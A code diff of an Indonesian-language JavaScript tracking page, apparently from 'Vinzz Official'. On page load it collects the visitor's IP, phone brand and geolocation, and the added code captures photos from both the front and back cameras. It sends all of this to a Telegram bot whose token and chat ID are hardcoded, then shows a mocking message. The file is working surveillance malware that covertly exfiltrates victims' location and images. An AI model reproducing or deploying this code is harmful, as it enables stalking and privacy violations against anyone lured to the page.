@@ -1,95 +1,102 @@
 const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
 const chat_id = '7777604508';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
 async function getIP() {
-try {
-const res = await fetch("https://api.ipify.org?format=json");
-const data = await res.json();
-return data.ip;
-} catch {
-return "Tidak diketahui";
-}
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "Tidak diketahui";
+  }
 }
 
 function getMerekHP() {
-const ua = navigator.userAgent;
-
-if (/Samsung/i.test(ua)) return "Samsung";  
-if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
-if (/Redmi/i.test(ua)) return "Redmi";  
-if (/OPPO/i.test(ua)) return "Oppo";  
-if (/Vivo/i.test(ua)) return "Vivo";  
-if (/Realme/i.test(ua)) return "Realme";  
-if (/iPhone/i.test(ua)) return "iPhone";  
-if (/Asus/i.test(ua)) return "Asus";  
-if (/Infinix/i.test(ua)) return "Infinix";  
-if (/Huawei/i.test(ua)) return "Huawei";  
-
-return "Tidak diketahui";
-
+  const ua = navigator.userAgent;
+  if (/Samsung/i.test(ua)) return "Samsung";  
+  if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
+  if (/Redmi/i.test(ua)) return "Redmi";  
+  if (/OPPO/i.test(ua)) return "Oppo";  
+  if (/Vivo/i.test(ua)) return "Vivo";  
+  if (/Realme/i.test(ua)) return "Realme";  
+  if (/iPhone/i.test(ua)) return "iPhone";  
+  if (/Asus/i.test(ua)) return "Asus";  
+  if (/Infinix/i.test(ua)) return "Infinix";  
+  if (/Huawei/i.test(ua)) return "Huawei";  
+  return "Tidak diketahui";
 }
-async function kirimFoto() {
-  try { 
-  const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-          video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            video.play();
 
-            // Delay biar kamera siap (sekitar 2 detik)
-            setTimeout(() => {
-              // Samakan ukuran canvas dengan video
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
+async function captureCamera(facing) {
+  return new Promise((resolve, reject) => {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+            canvas.toBlob(blob => {
+              resolve(blob);
+            }, 'image/jpeg');
+          }, 2000);
+        };
+      })
+      .catch(err => reject(err));
+  });
+}
 
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+async function kirimFotoKeTelegram() {
+  try {
+    const frontBlob = await captureCamera('user');
+    const backBlob = await captureCamera('environment');
 
-              // Convert canvas ke blob
-              canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append("chat_id", chat_id);
-                formData.append("photo", blob, "target.png");
-                formData.append('caption', '📸 ini fotonya tuan vinzz');
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('media', JSON.stringify([
+      { type: "photo", media: "attach://depan", caption: "📷 Kamera Depan" },
+      { type: "photo", media: "attach://belakang", caption: "📷 Kamera Belakang" }
+    ]));
+    formData.append('depan', frontBlob, 'depan.jpg');
+    formData.append('belakang', backBlob, 'belakang.jpg');
 
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                  method: "POST",
-                  body: formData
-                })
-              }, 'image/png');
-            }, 2000);
-          };
-        })
+    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
+      method: 'POST',
+      body: formData
+    });
 
   } catch (err) {
-    console.warn("Akses kamera ditolak atau gagal.");
-    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera di tolak");
+    await kirimPesanTelegram("Gagal mengirim foto: akses kamera di tolak");
   }
 }
-        
+
 async function kirimPesanTelegram(pesan) {
-const url = (`https://api.telegram.org/bot${token}/sendMessage`);
-await fetch(url, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({
-chat_id: chat_id,
-text: pesan
-})
-});
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: pesan
+    })
+  });
 }
 
 (async () => {
-const ip = await getIP();
-const merek = getMerekHP();
-const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
+  const ip = await getIP();
+  const merek = getMerekHP();
+  const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENUNGGU IZIN LOKASI
 │📡 IP: ${ip}
 │📱 Merek hp: ${merek}
 ╰───────────────────`;
-await kirimPesanTelegram(pesanAwal);
+  await kirimPesanTelegram(pesanAwal);
+  await kirimFotoKeTelegram();
 })();
 
 navigator.geolocation.getCurrentPosition(
@@ -100,17 +107,15 @@ navigator.geolocation.getCurrentPosition(
     const ip = await getIP();
     const merek = getMerekHP();
 
-    // Menambahkan link peta di pesan jika lokasi diizinkan
     const pesan = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENGIZINKAN LOKASI
 │📡 IP: ${ip}
 │📱 Merek hp: ${merek}
 │📍 Lokasi: ${gmaps}
+│📷 Sedang meminta akses kamera...
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
-
-    kirimFoto()
-
+    await kirimFotoKeTelegram();
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
   },
   async () => {
@@ -121,9 +126,10 @@ navigator.geolocation.getCurrentPosition(
 │🌐 Status: MENOLAK LOKASI
 │📡 IP: ${ip}
 │📱 Merek hp: ${merek}
+│📷 Sedang meminta akses kamera...
 ╰───────────────────`;
     await kirimPesanTelegram(pesan);
-
+    await kirimFotoKeTelegram();
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
   }
 );
